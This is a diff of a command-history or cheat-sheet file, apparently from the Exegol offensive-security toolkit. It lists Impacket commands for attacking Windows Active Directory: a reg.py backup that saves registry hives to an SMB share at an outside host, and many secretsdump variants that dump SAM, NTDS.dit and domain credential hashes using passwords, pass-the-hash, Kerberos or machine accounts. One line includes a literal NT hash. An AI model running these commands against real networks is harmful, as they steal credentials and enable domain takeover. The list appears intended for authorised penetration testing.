@@ -6,9 +6,9 @@ reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" backup -o '\\192.168.56.1\SHUTDOW
 smbserver.py -smb2support EXEGOL .
 secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 secretsdump -ntds ntds.dit.save -system system.save LOCAL
+secretsdump "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 secretsdump -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 secretsdump -k "$TARGET"
-secretsdump -k -outputfile "$DOMAIN" "$DC_HOST"
 secretsdump -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 secretsdump -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 "$DOMAIN"/Administrator@"$DC_HOST"
 secretsdump -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
